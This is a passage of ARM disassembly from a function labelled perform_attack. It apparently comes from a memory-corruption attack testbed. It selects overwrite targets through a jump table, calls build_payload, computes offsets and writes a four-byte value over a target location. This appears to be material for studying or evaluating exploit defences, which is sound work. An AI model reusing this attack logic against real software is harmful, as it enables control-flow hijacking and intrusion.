    9ca4:	e103      	b.n	9eae <perform_attack+0xe5a>
    9ca6:	f646 2388 	movw	r3, #27272	; 0x6a88
    9caa:	f2c0 0301 	movt	r3, #1
    9cae:	689b      	ldr	r3, [r3, #8]
    9cb0:	f5a3 7396 	sub.w	r3, r3, #300	; 0x12c
    9cb4:	2b0b      	cmp	r3, #11
    9cb6:	f200 80cb 	bhi.w	9e50 <perform_attack+0xdfc>
    9cba:	f20f 0c08 	addw	ip, pc, #8
    9cbe:	f85c f023 	ldr.w	pc, [ip, r3, lsl #2]
    9cc2:	bf00      	nop
    9cc4:	00009cf5 	.word	0x00009cf5
    9cc8:	00009d0f 	.word	0x00009d0f
    9ccc:	00009d5f 	.word	0x00009d5f
    9cd0:	00009d73 	.word	0x00009d73
    9cd4:	00009d85 	.word	0x00009d85
    9cd8:	00009d9d 	.word	0x00009d9d
    9cdc:	00009db1 	.word	0x00009db1
    9ce0:	00009ded 	.word	0x00009ded
    9ce4:	00009e03 	.word	0x00009e03
    9ce8:	00009e1b 	.word	0x00009e1b
    9cec:	00009e35 	.word	0x00009e35
    9cf0:	00009e43 	.word	0x00009e43
    9cf4:	f507 3052 	add.w	r0, r7, #215040	; 0x34800
    9cf8:	f100 0098 	add.w	r0, r0, #152	; 0x98
    9cfc:	6803      	ldr	r3, [r0, #0]
    9cfe:	f103 0210 	add.w	r2, r3, #16
    9d02:	f507 5353 	add.w	r3, r7, #13504	; 0x34c0
    9d06:	f5a3 7341 	sub.w	r3, r3, #772	; 0x304
    9d0a:	609a      	str	r2, [r3, #8]
    9d0c:	e0b7      	b.n	9e7e <perform_attack+0xe2a>
    9d0e:	f507 3152 	add.w	r1, r7, #215040	; 0x34800
    9d12:	f101 0198 	add.w	r1, r1, #152	; 0x98
    9d16:	680b      	ldr	r3, [r1, #0]
    9d18:	f103 020c 	add.w	r2, r3, #12
    9d1c:	f507 5353 	add.w	r3, r7, #13504	; 0x34c0
    9d20:	f5a3 7341 	sub.w	r3, r3, #772	; 0x304
    9d24:	609a      	str	r2, [r3, #8]
    9d26:	f646 2388 	movw	r3, #27272	; 0x6a88
    9d2a:	f2c0 0301 	movt	r3, #1
    9d2e:	685b      	ldr	r3, [r3, #4]
    9d30:	2bcb      	cmp	r3, #203	; 0xcb
    9d32:	d109      	bne.n	9d48 <perform_attack+0xcf4>
    9d34:	f507 5353 	add.w	r3, r7, #13504	; 0x34c0
    9d38:	f5a3 7341 	sub.w	r3, r3, #772	; 0x304
    9d3c:	f648 12e0 	movw	r2, #35296	; 0x89e0
    9d40:	f2c0 0200 	movt	r2, #0
    9d44:	621a      	str	r2, [r3, #32]
    9d46:	e09a      	b.n	9e7e <perform_attack+0xe2a>
    9d48:	f507 5353 	add.w	r3, r7, #13504	; 0x34c0
    9d4c:	f5a3 7332 	sub.w	r3, r3, #712	; 0x2c8
    9d50:	681a      	ldr	r2, [r3, #0]
    9d52:	f507 5353 	add.w	r3, r7, #13504	; 0x34c0
    9d56:	f5a3 7341 	sub.w	r3, r3, #772	; 0x304
    9d5a:	621a      	str	r2, [r3, #32]
    9d5c:	e08f      	b.n	9e7e <perform_attack+0xe2a>
    9d5e:	f507 5353 	add.w	r3, r7, #13504	; 0x34c0
    9d62:	f5a3 7341 	sub.w	r3, r3, #772	; 0x304
    9d66:	f507 3251 	add.w	r2, r7, #214016	; 0x34400
    9d6a:	f502 7241 	add.w	r2, r2, #772	; 0x304
    9d6e:	609a      	str	r2, [r3, #8]
    9d70:	e085      	b.n	9e7e <perform_attack+0xe2a>
    9d72:	f507 5353 	add.w	r3, r7, #13504	; 0x34c0
    9d76:	f5a3 7341 	sub.w	r3, r3, #772	; 0x304
    9d7a:	f107 02c0 	add.w	r2, r7, #192	; 0xc0
    9d7e:	3ab8      	subs	r2, #184	; 0xb8
    9d80:	609a      	str	r2, [r3, #8]
    9d82:	e07c      	b.n	9e7e <perform_attack+0xe2a>
    9d84:	f507 5353 	add.w	r3, r7, #13504	; 0x34c0
    9d88:	f5a3 7341 	sub.w	r3, r3, #772	; 0x304
    9d8c:	f507 3c52 	add.w	ip, r7, #215040	; 0x34800
    9d90:	f10c 0cb8 	add.w	ip, ip, #184	; 0xb8
    9d94:	f8dc 2000 	ldr.w	r2, [ip]
    9d98:	609a      	str	r2, [r3, #8]
    9d9a:	e070      	b.n	9e7e <perform_attack+0xe2a>
    9d9c:	f507 5353 	add.w	r3, r7, #13504	; 0x34c0
    9da0:	f5a3 7341 	sub.w	r3, r3, #772	; 0x304
    9da4:	f646 3224 	movw	r2, #27428	; 0x6b24
    9da8:	f2c0 0201 	movt	r2, #1
    9dac:	609a      	str	r2, [r3, #8]
    9dae:	e066      	b.n	9e7e <perform_attack+0xe2a>
    9db0:	f246 7348 	movw	r3, #26440	; 0x6748
    9db4:	f2c0 0301 	movt	r3, #1
    9db8:	4618      	mov	r0, r3
    9dba:	f001 fe43 	bl	ba44 <contains_terminating_char>
    9dbe:	4603      	mov	r3, r0
    9dc0:	2b00      	cmp	r3, #0
    9dc2:	d009      	beq.n	9dd8 <perform_attack+0xd84>
    9dc4:	f507 5353 	add.w	r3, r7, #13504	; 0x34c0
    9dc8:	f5a3 7341 	sub.w	r3, r3, #772	; 0x304
    9dcc:	f246 7244 	movw	r2, #26436	; 0x6744
    9dd0:	f2c0 0201 	movt	r2, #1
    9dd4:	609a      	str	r2, [r3, #8]
    9dd6:	e052      	b.n	9e7e <perform_attack+0xe2a>
    9dd8:	f507 5353 	add.w	r3, r7, #13504	; 0x34c0
    9ddc:	f5a3 7341 	sub.w	r3, r3, #772	; 0x304
    9de0:	f246 7248 	movw	r2, #26440	; 0x6748
    9de4:	f2c0 0201 	movt	r2, #1
    9de8:	609a      	str	r2, [r3, #8]
    9dea:	e048      	b.n	9e7e <perform_attack+0xe2a>
    9dec:	f507 5353 	add.w	r3, r7, #13504	; 0x34c0
    9df0:	f5a3 7341 	sub.w	r3, r3, #772	; 0x304
    9df4:	f507 3251 	add.w	r2, r7, #214016	; 0x34400
    9df8:	f502 7242 	add.w	r2, r2, #776	; 0x308
    9dfc:	3214      	adds	r2, #20
    9dfe:	609a      	str	r2, [r3, #8]
    9e00:	e03d      	b.n	9e7e <perform_attack+0xe2a>
    9e02:	f107 03c0 	add.w	r3, r7, #192	; 0xc0
    9e06:	3bbc      	subs	r3, #188	; 0xbc
    9e08:	681b      	ldr	r3, [r3, #0]
    9e0a:	f103 0214 	add.w	r2, r3, #20
    9e0e:	f507 5353 	add.w	r3, r7, #13504	; 0x34c0
    9e12:	f5a3 7341 	sub.w	r3, r3, #772	; 0x304
    9e16:	609a      	str	r2, [r3, #8]
    9e18:	e031      	b.n	9e7e <perform_attack+0xe2a>
    9e1a:	f507 3052 	add.w	r0, r7, #215040	; 0x34800
    9e1e:	f100 00b4 	add.w	r0, r0, #180	; 0xb4
    9e22:	6803      	ldr	r3, [r0, #0]
    9e24:	f103 0214 	add.w	r2, r3, #20
    9e28:	f507 5353 	add.w	r3, r7, #13504	; 0x34c0
    9e2c:	f5a3 7341 	sub.w	r3, r3, #772	; 0x304
    9e30:	609a      	str	r2, [r3, #8]
    9e32:	e024      	b.n	9e7e <perform_attack+0xe2a>
    9e34:	f507 5353 	add.w	r3, r7, #13504	; 0x34c0
    9e38:	f5a3 7341 	sub.w	r3, r3, #772	; 0x304
    9e3c:	4acd      	ldr	r2, [pc, #820]	; (a174 <perform_attack+0x1120>)
    9e3e:	609a      	str	r2, [r3, #8]
    9e40:	e01d      	b.n	9e7e <perform_attack+0xe2a>
    9e42:	f507 5353 	add.w	r3, r7, #13504	; 0x34c0
    9e46:	f5a3 7341 	sub.w	r3, r3, #772	; 0x304
    9e4a:	4acb      	ldr	r2, [pc, #812]	; (a178 <perform_attack+0x1124>)
    9e4c:	609a      	str	r2, [r3, #8]
    9e4e:	e016      	b.n	9e7e <perform_attack+0xe2a>
    9e50:	f646 0350 	movw	r3, #26704	; 0x6850
    9e54:	f2c0 0301 	movt	r3, #1
    9e58:	681b      	ldr	r3, [r3, #0]
    9e5a:	2b00      	cmp	r3, #0
    9e5c:	d00c      	beq.n	9e78 <perform_attack+0xe24>
    9e5e:	f646 0360 	movw	r3, #26720	; 0x6860
    9e62:	f2c0 0301 	movt	r3, #1
    9e66:	681b      	ldr	r3, [r3, #0]
    9e68:	f64c 3094 	movw	r0, #52116	; 0xcb94
    9e6c:	f2c0 0000 	movt	r0, #0
    9e70:	2101      	movs	r1, #1
    9e72:	2226      	movs	r2, #38	; 0x26
    9e74:	f7fe ed66 	blx	8944 <_init+0xb0>
    9e78:	2001      	movs	r0, #1
    9e7a:	f7fe ed9a 	blx	89b0 <_init+0x11c>
    9e7e:	e016      	b.n	9eae <perform_attack+0xe5a>
    9e80:	f646 0350 	movw	r3, #26704	; 0x6850
    9e84:	f2c0 0301 	movt	r3, #1
    9e88:	681b      	ldr	r3, [r3, #0]
    9e8a:	2b00      	cmp	r3, #0
    9e8c:	d00c      	beq.n	9ea8 <perform_attack+0xe54>
    9e8e:	f646 0360 	movw	r3, #26720	; 0x6860
    9e92:	f2c0 0301 	movt	r3, #1
    9e96:	681b      	ldr	r3, [r3, #0]
    9e98:	f64c 400c 	movw	r0, #52236	; 0xcc0c
    9e9c:	f2c0 0000 	movt	r0, #0
    9ea0:	2101      	movs	r1, #1
    9ea2:	2223      	movs	r2, #35	; 0x23
    9ea4:	f7fe ed4e 	blx	8944 <_init+0xb0>
    9ea8:	2001      	movs	r0, #1
    9eaa:	f7fe ed82 	blx	89b0 <_init+0x11c>
    9eae:	f507 5353 	add.w	r3, r7, #13504	; 0x34c0
    9eb2:	f5a3 7333 	sub.w	r3, r3, #716	; 0x2cc
    9eb6:	681b      	ldr	r3, [r3, #0]
    9eb8:	461a      	mov	r2, r3
    9eba:	f507 5353 	add.w	r3, r7, #13504	; 0x34c0
    9ebe:	f5a3 7332 	sub.w	r3, r3, #712	; 0x2c8
    9ec2:	681b      	ldr	r3, [r3, #0]
    9ec4:	429a      	cmp	r2, r3
    9ec6:	d968      	bls.n	9f9a <perform_attack+0xf46>
    9ec8:	f507 5353 	add.w	r3, r7, #13504	; 0x34c0
    9ecc:	f5a3 7333 	sub.w	r3, r3, #716	; 0x2cc
    9ed0:	681b      	ldr	r3, [r3, #0]
    9ed2:	461a      	mov	r2, r3
    9ed4:	f507 5353 	add.w	r3, r7, #13504	; 0x34c0
    9ed8:	f5a3 7332 	sub.w	r3, r3, #712	; 0x2c8
    9edc:	681b      	ldr	r3, [r3, #0]
    9ede:	1ad3      	subs	r3, r2, r3
    9ee0:	1d5a      	adds	r2, r3, #5
    9ee2:	f507 5353 	add.w	r3, r7, #13504	; 0x34c0
    9ee6:	f5a3 7341 	sub.w	r3, r3, #772	; 0x304
    9eea:	605a      	str	r2, [r3, #4]
    9eec:	f646 0360 	movw	r3, #26720	; 0x6860
    9ef0:	f2c0 0301 	movt	r3, #1
    9ef4:	681a      	ldr	r2, [r3, #0]
    9ef6:	f507 5353 	add.w	r3, r7, #13504	; 0x34c0
    9efa:	f5a3 7333 	sub.w	r3, r3, #716	; 0x2cc
    9efe:	681b      	ldr	r3, [r3, #0]
    9f00:	4610      	mov	r0, r2
    9f02:	f64c 41c8 	movw	r1, #52424	; 0xccc8
    9f06:	f2c0 0100 	movt	r1, #0
    9f0a:	461a      	mov	r2, r3
    9f0c:	f7fe ed62 	blx	89d4 <_init+0x140>
    9f10:	f646 0360 	movw	r3, #26720	; 0x6860
    9f14:	f2c0 0301 	movt	r3, #1
    9f18:	681a      	ldr	r2, [r3, #0]
    9f1a:	f507 5353 	add.w	r3, r7, #13504	; 0x34c0
    9f1e:	f5a3 7332 	sub.w	r3, r3, #712	; 0x2c8
    9f22:	681b      	ldr	r3, [r3, #0]
    9f24:	4610      	mov	r0, r2
    9f26:	f64c 41dc 	movw	r1, #52444	; 0xccdc
    9f2a:	f2c0 0100 	movt	r1, #0
    9f2e:	461a      	mov	r2, r3
    9f30:	f7fe ed50 	blx	89d4 <_init+0x140>
    9f34:	f646 0360 	movw	r3, #26720	; 0x6860
    9f38:	f2c0 0301 	movt	r3, #1
    9f3c:	681a      	ldr	r2, [r3, #0]
    9f3e:	f507 5353 	add.w	r3, r7, #13504	; 0x34c0
    9f42:	f5a3 7341 	sub.w	r3, r3, #772	; 0x304
    9f46:	685b      	ldr	r3, [r3, #4]
    9f48:	4610      	mov	r0, r2
    9f4a:	f64c 41ec 	movw	r1, #52460	; 0xccec
    9f4e:	f2c0 0100 	movt	r1, #0
    9f52:	461a      	mov	r2, r3
    9f54:	f7fe ed3e 	blx	89d4 <_init+0x140>
    9f58:	f646 0360 	movw	r3, #26720	; 0x6860
    9f5c:	f2c0 0301 	movt	r3, #1
    9f60:	681a      	ldr	r2, [r3, #0]
    9f62:	f507 3350 	add.w	r3, r7, #212992	; 0x34000
    9f66:	f503 7340 	add.w	r3, r3, #768	; 0x300
    9f6a:	4610      	mov	r0, r2
    9f6c:	f64c 41fc 	movw	r1, #52476	; 0xccfc
    9f70:	f2c0 0100 	movt	r1, #0
    9f74:	461a      	mov	r2, r3
    9f76:	f7fe ed2e 	blx	89d4 <_init+0x140>
    9f7a:	f507 5353 	add.w	r3, r7, #13504	; 0x34c0
    9f7e:	f5a3 7332 	sub.w	r3, r3, #712	; 0x2c8
    9f82:	681b      	ldr	r3, [r3, #0]
    9f84:	2200      	movs	r2, #0
    9f86:	701a      	strb	r2, [r3, #0]
    9f88:	f646 2380 	movw	r3, #27264	; 0x6a80
    9f8c:	f2c0 0301 	movt	r3, #1
    9f90:	681b      	ldr	r3, [r3, #0]
    9f92:	2b00      	cmp	r3, #0
    9f94:	f000 80bc 	beq.w	a110 <perform_attack+0x10bc>
    9f98:	e06a      	b.n	a070 <perform_attack+0x101c>
    9f9a:	f646 0350 	movw	r3, #26704	; 0x6850
    9f9e:	f2c0 0301 	movt	r3, #1
    9fa2:	681b      	ldr	r3, [r3, #0]
    9fa4:	2b00      	cmp	r3, #0
    9fa6:	d060      	beq.n	a06a <perform_attack+0x1016>
    9fa8:	f646 0360 	movw	r3, #26720	; 0x6860
    9fac:	f2c0 0301 	movt	r3, #1
    9fb0:	681b      	ldr	r3, [r3, #0]
    9fb2:	f64c 5010 	movw	r0, #52496	; 0xcd10
    9fb6:	f2c0 0000 	movt	r0, #0
    9fba:	2101      	movs	r1, #1
    9fbc:	2240      	movs	r2, #64	; 0x40
    9fbe:	f7fe ecc2 	blx	8944 <_init+0xb0>
    9fc2:	f646 0360 	movw	r3, #26720	; 0x6860
    9fc6:	f2c0 0301 	movt	r3, #1
    9fca:	681b      	ldr	r3, [r3, #0]
    9fcc:	f64c 5054 	movw	r0, #52564	; 0xcd54
    9fd0:	f2c0 0000 	movt	r0, #0
    9fd4:	2101      	movs	r1, #1
    9fd6:	2231      	movs	r2, #49	; 0x31
    9fd8:	f7fe ecb4 	blx	8944 <_init+0xb0>
    9fdc:	f646 0360 	movw	r3, #26720	; 0x6860
    9fe0:	f2c0 0301 	movt	r3, #1
    9fe4:	681a      	ldr	r2, [r3, #0]
    9fe6:	f507 5353 	add.w	r3, r7, #13504	; 0x34c0
    9fea:	f5a3 7333 	sub.w	r3, r3, #716	; 0x2cc
    9fee:	681b      	ldr	r3, [r3, #0]
    9ff0:	4610      	mov	r0, r2
    9ff2:	f64c 41c8 	movw	r1, #52424	; 0xccc8
    9ff6:	f2c0 0100 	movt	r1, #0
    9ffa:	461a      	mov	r2, r3
    9ffc:	f7fe ecea 	blx	89d4 <_init+0x140>
    a000:	f646 0360 	movw	r3, #26720	; 0x6860
    a004:	f2c0 0301 	movt	r3, #1
    a008:	681b      	ldr	r3, [r3, #0]
    a00a:	4618      	mov	r0, r3
    a00c:	f64c 5188 	movw	r1, #52616	; 0xcd88
    a010:	f2c0 0100 	movt	r1, #0
    a014:	f507 3352 	add.w	r3, r7, #215040	; 0x34800
    a018:	f103 03b8 	add.w	r3, r3, #184	; 0xb8
    a01c:	681a      	ldr	r2, [r3, #0]
    a01e:	f7fe ecda 	blx	89d4 <_init+0x140>
    a022:	f646 0360 	movw	r3, #26720	; 0x6860
    a026:	f2c0 0301 	movt	r3, #1
    a02a:	681a      	ldr	r2, [r3, #0]
    a02c:	f507 5353 	add.w	r3, r7, #13504	; 0x34c0
    a030:	f5a3 7332 	sub.w	r3, r3, #712	; 0x2c8
    a034:	681b      	ldr	r3, [r3, #0]
    a036:	4610      	mov	r0, r2
    a038:	f64c 41dc 	movw	r1, #52444	; 0xccdc
    a03c:	f2c0 0100 	movt	r1, #0
    a040:	461a      	mov	r2, r3
    a042:	f7fe ecc8 	blx	89d4 <_init+0x140>
    a046:	f646 0360 	movw	r3, #26720	; 0x6860
    a04a:	f2c0 0301 	movt	r3, #1
    a04e:	681a      	ldr	r2, [r3, #0]
    a050:	f507 5353 	add.w	r3, r7, #13504	; 0x34c0
    a054:	f5a3 7341 	sub.w	r3, r3, #772	; 0x304
    a058:	685b      	ldr	r3, [r3, #4]
    a05a:	4610      	mov	r0, r2
    a05c:	f64c 51a0 	movw	r1, #52640	; 0xcda0
    a060:	f2c0 0100 	movt	r1, #0
    a064:	461a      	mov	r2, r3
    a066:	f7fe ecb6 	blx	89d4 <_init+0x140>
    a06a:	2001      	movs	r0, #1
    a06c:	f7fe eca0 	blx	89b0 <_init+0x11c>
    a070:	f107 03c0 	add.w	r3, r7, #192	; 0xc0
    a074:	3bb4      	subs	r3, #180	; 0xb4
    a076:	6819      	ldr	r1, [r3, #0]
    a078:	f507 5353 	add.w	r3, r7, #13504	; 0x34c0
    a07c:	f5a3 7333 	sub.w	r3, r3, #716	; 0x2cc
    a080:	f507 5253 	add.w	r2, r7, #13504	; 0x34c0
    a084:	f5a2 7233 	sub.w	r2, r2, #716	; 0x2cc
    a088:	6812      	ldr	r2, [r2, #0]
    a08a:	4614      	mov	r4, r2
    a08c:	f507 5253 	add.w	r2, r7, #13504	; 0x34c0
    a090:	f5a2 7233 	sub.w	r2, r2, #716	; 0x2cc
    a094:	6812      	ldr	r2, [r2, #0]
    a096:	6812      	ldr	r2, [r2, #0]
    a098:	9200      	str	r2, [sp, #0]
    a09a:	4608      	mov	r0, r1
    a09c:	f64c 51b4 	movw	r1, #52660	; 0xcdb4
    a0a0:	f2c0 0100 	movt	r1, #0
    a0a4:	461a      	mov	r2, r3
    a0a6:	4623      	mov	r3, r4
    a0a8:	f7fe ec94 	blx	89d4 <_init+0x140>
    a0ac:	f107 03c0 	add.w	r3, r7, #192	; 0xc0
    a0b0:	3bb4      	subs	r3, #180	; 0xb4
    a0b2:	6819      	ldr	r1, [r3, #0]
    a0b4:	f507 3251 	add.w	r2, r7, #214016	; 0x34400
    a0b8:	f502 7240 	add.w	r2, r2, #768	; 0x300
    a0bc:	f507 3351 	add.w	r3, r7, #214016	; 0x34400
    a0c0:	f503 7340 	add.w	r3, r3, #768	; 0x300
    a0c4:	681b      	ldr	r3, [r3, #0]
    a0c6:	f507 3051 	add.w	r0, r7, #214016	; 0x34400
    a0ca:	f500 7040 	add.w	r0, r0, #768	; 0x300
    a0ce:	6800      	ldr	r0, [r0, #0]
    a0d0:	6800      	ldr	r0, [r0, #0]
    a0d2:	9000      	str	r0, [sp, #0]
    a0d4:	4608      	mov	r0, r1
    a0d6:	f64c 51f0 	movw	r1, #52720	; 0xcdf0
    a0da:	f2c0 0100 	movt	r1, #0
    a0de:	f7fe ec7a 	blx	89d4 <_init+0x140>
    a0e2:	f107 03c0 	add.w	r3, r7, #192	; 0xc0
    a0e6:	3bb4      	subs	r3, #180	; 0xb4
    a0e8:	6819      	ldr	r1, [r3, #0]
    a0ea:	f507 5353 	add.w	r3, r7, #13504	; 0x34c0
    a0ee:	f5a3 7332 	sub.w	r3, r3, #712	; 0x2c8
    a0f2:	f507 5253 	add.w	r2, r7, #13504	; 0x34c0
    a0f6:	f5a2 7232 	sub.w	r2, r2, #712	; 0x2c8
    a0fa:	6812      	ldr	r2, [r2, #0]
    a0fc:	4614      	mov	r4, r2
    a0fe:	4608      	mov	r0, r1
    a100:	f64c 6134 	movw	r1, #52788	; 0xce34
    a104:	f2c0 0100 	movt	r1, #0
    a108:	461a      	mov	r2, r3
    a10a:	4623      	mov	r3, r4
    a10c:	f7fe ec62 	blx	89d4 <_init+0x140>
    a110:	f507 5353 	add.w	r3, r7, #13504	; 0x34c0
    a114:	f5a3 7341 	sub.w	r3, r3, #772	; 0x304
    a118:	4618      	mov	r0, r3
    a11a:	f000 fddd 	bl	acd8 <build_payload>
    a11e:	4603      	mov	r3, r0
    a120:	2b00      	cmp	r3, #0
    a122:	d11e      	bne.n	a162 <perform_attack+0x110e>
    a124:	f646 0350 	movw	r3, #26704	; 0x6850
    a128:	f2c0 0301 	movt	r3, #1
    a12c:	681b      	ldr	r3, [r3, #0]
    a12e:	2b00      	cmp	r3, #0
    a130:	d014      	beq.n	a15c <perform_attack+0x1108>
    a132:	f646 0360 	movw	r3, #26720	; 0x6860
    a136:	f2c0 0301 	movt	r3, #1
    a13a:	681b      	ldr	r3, [r3, #0]
    a13c:	f64c 6054 	movw	r0, #52820	; 0xce54
    a140:	f2c0 0000 	movt	r0, #0
    a144:	2101      	movs	r1, #1
    a146:	221f      	movs	r2, #31
    a148:	f7fe ebfc 	blx	8944 <_init+0xb0>
    a14c:	f646 0360 	movw	r3, #26720	; 0x6860
    a150:	f2c0 0301 	movt	r3, #1
    a154:	681b      	ldr	r3, [r3, #0]
    a156:	4618      	mov	r0, r3
    a158:	f7fe ebca 	blx	88f0 <_init+0x5c>
    a15c:	2001      	movs	r0, #1
    a15e:	f7fe ec28 	blx	89b0 <_init+0x11c>
    a162:	2300      	movs	r3, #0
    a164:	f507 3c52 	add.w	ip, r7, #215040	; 0x34800
    a168:	f10c 0cac 	add.w	ip, ip, #172	; 0xac
    a16c:	f8cc 3000 	str.w	r3, [ip]
    a170:	e02d      	b.n	a1ce <perform_attack+0x117a>
    a172:	bf00      	nop
    a174:	00016e54 	.word	0x00016e54
    a178:	0001688c 	.word	0x0001688c
    a17c:	f646 0360 	movw	r3, #26720	; 0x6860
    a180:	f2c0 0301 	movt	r3, #1
    a184:	681a      	ldr	r2, [r3, #0]
    a186:	f507 5353 	add.w	r3, r7, #13504	; 0x34c0
    a18a:	f5a3 7341 	sub.w	r3, r3, #772	; 0x304
    a18e:	68d9      	ldr	r1, [r3, #12]
    a190:	f507 3052 	add.w	r0, r7, #215040	; 0x34800
    a194:	f100 00ac 	add.w	r0, r0, #172	; 0xac
    a198:	6803      	ldr	r3, [r0, #0]
    a19a:	440b      	add	r3, r1
    a19c:	781b      	ldrb	r3, [r3, #0]
    a19e:	4610      	mov	r0, r2
    a1a0:	f64c 6174 	movw	r1, #52852	; 0xce74
    a1a4:	f2c0 0100 	movt	r1, #0
    a1a8:	f507 3c52 	add.w	ip, r7, #215040	; 0x34800
    a1ac:	f10c 0cac 	add.w	ip, ip, #172	; 0xac
    a1b0:	f8dc 2000 	ldr.w	r2, [ip]
    a1b4:	f7fe ec0e 	blx	89d4 <_init+0x140>
    a1b8:	f507 3052 	add.w	r0, r7, #215040	; 0x34800
    a1bc:	f100 00ac 	add.w	r0, r0, #172	; 0xac
    a1c0:	6803      	ldr	r3, [r0, #0]
    a1c2:	3301      	adds	r3, #1
    a1c4:	f507 3152 	add.w	r1, r7, #215040	; 0x34800
    a1c8:	f101 01ac 	add.w	r1, r1, #172	; 0xac
    a1cc:	600b      	str	r3, [r1, #0]
    a1ce:	f507 3352 	add.w	r3, r7, #215040	; 0x34800
    a1d2:	f103 03ac 	add.w	r3, r3, #172	; 0xac
    a1d6:	681a      	ldr	r2, [r3, #0]
    a1d8:	f507 5353 	add.w	r3, r7, #13504	; 0x34c0
    a1dc:	f5a3 7341 	sub.w	r3, r3, #772	; 0x304
    a1e0:	685b      	ldr	r3, [r3, #4]
    a1e2:	429a      	cmp	r2, r3
    a1e4:	d3ca      	bcc.n	a17c <perform_attack+0x1128>
    a1e6:	f646 0360 	movw	r3, #26720	; 0x6860
    a1ea:	f2c0 0301 	movt	r3, #1
    a1ee:	681b      	ldr	r3, [r3, #0]
    a1f0:	200a      	movs	r0, #10
    a1f2:	4619      	mov	r1, r3
    a1f4:	f7fe ec24 	blx	8a40 <_init+0x1ac>
    a1f8:	f646 2388 	movw	r3, #27272	; 0x6a88
    a1fc:	f2c0 0301 	movt	r3, #1
    a200:	681b      	ldr	r3, [r3, #0]
    a202:	2b64      	cmp	r3, #100	; 0x64
    a204:	d13e      	bne.n	a284 <perform_attack+0x1230>
    a206:	f646 2388 	movw	r3, #27272	; 0x6a88
    a20a:	f2c0 0301 	movt	r3, #1
    a20e:	689a      	ldr	r2, [r3, #8]
    a210:	f240 132d 	movw	r3, #301	; 0x12d
    a214:	429a      	cmp	r2, r3
    a216:	d135      	bne.n	a284 <perform_attack+0x1230>
    a218:	f507 5353 	add.w	r3, r7, #13504	; 0x34c0
    a21c:	f5a3 7332 	sub.w	r3, r3, #712	; 0x2c8
    a220:	681a      	ldr	r2, [r3, #0]
    a222:	f507 5353 	add.w	r3, r7, #13504	; 0x34c0
    a226:	f5a3 7341 	sub.w	r3, r3, #772	; 0x304
    a22a:	6859      	ldr	r1, [r3, #4]
    a22c:	f507 5353 	add.w	r3, r7, #13504	; 0x34c0
    a230:	f5a3 7341 	sub.w	r3, r3, #772	; 0x304
    a234:	69db      	ldr	r3, [r3, #28]
    a236:	1acb      	subs	r3, r1, r3
    a238:	3b0d      	subs	r3, #13
    a23a:	441a      	add	r2, r3
    a23c:	f507 3351 	add.w	r3, r7, #214016	; 0x34400
    a240:	f503 7340 	add.w	r3, r3, #768	; 0x300
    a244:	601a      	str	r2, [r3, #0]
    a246:	f507 5353 	add.w	r3, r7, #13504	; 0x34c0
    a24a:	f5a3 7341 	sub.w	r3, r3, #772	; 0x304
    a24e:	f507 3251 	add.w	r2, r7, #214016	; 0x34400
    a252:	f502 7240 	add.w	r2, r2, #768	; 0x300
    a256:	609a      	str	r2, [r3, #8]
    a258:	f507 5353 	add.w	r3, r7, #13504	; 0x34c0
    a25c:	f5a3 7341 	sub.w	r3, r3, #772	; 0x304
    a260:	68da      	ldr	r2, [r3, #12]
    a262:	f507 5353 	add.w	r3, r7, #13504	; 0x34c0
    a266:	f5a3 7341 	sub.w	r3, r3, #772	; 0x304
    a26a:	685b      	ldr	r3, [r3, #4]
    a26c:	3b09      	subs	r3, #9
    a26e:	441a      	add	r2, r3
    a270:	f507 5353 	add.w	r3, r7, #13504	; 0x34c0
    a274:	f5a3 7341 	sub.w	r3, r3, #772	; 0x304
    a278:	689b      	ldr	r3, [r3, #8]
    a27a:	4610      	mov	r0, r2
    a27c:	4619      	mov	r1, r3
    a27e:	2204      	movs	r2, #4
    a280:	f7fe eb48 	blx	8914 <_init+0x80>
    a284:	f646 2380 	movw	r3, #27264	; 0x6a80
    a288:	f2c0 0301 	movt	r3, #1
    a28c:	681b      	ldr	r3, [r3, #0]
    a28e:	2b00      	cmp	r3, #0
    a290:	f000 8089 	beq.w	a3a6 <perform_attack+0x1352>
    a294:	f507 5353 	add.w	r3, r7, #13504	; 0x34c0
    a298:	f5a3 7341 	sub.w	r3, r3, #772	; 0x304
    a29c:	68d9      	ldr	r1, [r3, #12]
    a29e:	f507 5353 	add.w	r3, r7, #13504	; 0x34c0
    a2a2:	f5a3 7341 	sub.w	r3, r3, #772	; 0x304
    a2a6:	685b      	ldr	r3, [r3, #4]
    a2a8:	089a      	lsrs	r2, r3, #2
    a2aa:	f507 5353 	add.w	r3, r7, #13504	; 0x34c0
    a2ae:	f5a3 7341 	sub.w	r3, r3, #772	; 0x304
    a2b2:	685b      	ldr	r3, [r3, #4]
    a2b4:	f003 0303 	and.w	r3, r3, #3
    a2b8:	441a      	add	r2, r3
    a2ba:	f107 03c0 	add.w	r3, r7, #192	; 0xc0
    a2be:	3b84      	subs	r3, #132	; 0x84
    a2c0:	4618      	mov	r0, r3
    a2c2:	f001 fce7 	bl	bc94 <save_memory>
    a2c6:	f107 03c0 	add.w	r3, r7, #192	; 0xc0
    a2ca:	3bb4      	subs	r3, #180	; 0xb4
    a2cc:	681a      	ldr	r2, [r3, #0]
    a2ce:	f507 5353 	add.w	r3, r7, #13504	; 0x34c0
    a2d2:	f5a3 7341 	sub.w	r3, r3, #772	; 0x304
    a2d6:	330c      	adds	r3, #12
    a2d8:	4610      	mov	r0, r2
    a2da:	f64c 6180 	movw	r1, #52864	; 0xce80
    a2de:	f2c0 0100 	movt	r1, #0
    a2e2:	461a      	mov	r2, r3
    a2e4:	f7fe eb76 	blx	89d4 <_init+0x140>
    a2e8:	f107 03c0 	add.w	r3, r7, #192	; 0xc0
    a2ec:	3bb4      	subs	r3, #180	; 0xb4
    a2ee:	681a      	ldr	r2, [r3, #0]
    a2f0:	f507 5353 	add.w	r3, r7, #13504	; 0x34c0
    a2f4:	f5a3 7341 	sub.w	r3, r3, #772	; 0x304
    a2f8:	68db      	ldr	r3, [r3, #12]
    a2fa:	4610      	mov	r0, r2
    a2fc:	f64c 61a4 	movw	r1, #52900	; 0xcea4
    a300:	f2c0 0100 	movt	r1, #0
    a304:	461a      	mov	r2, r3
    a306:	f7fe eb66 	blx	89d4 <_init+0x140>
    a30a:	f107 03c0 	add.w	r3, r7, #192	; 0xc0
    a30e:	3bb4      	subs	r3, #180	; 0xb4
    a310:	681a      	ldr	r2, [r3, #0]
    a312:	f507 5353 	add.w	r3, r7, #13504	; 0x34c0
    a316:	f5a3 7332 	sub.w	r3, r3, #712	; 0x2c8
    a31a:	681b      	ldr	r3, [r3, #0]
    a31c:	4610      	mov	r0, r2
    a31e:	f64c 61c4 	movw	r1, #52932	; 0xcec4
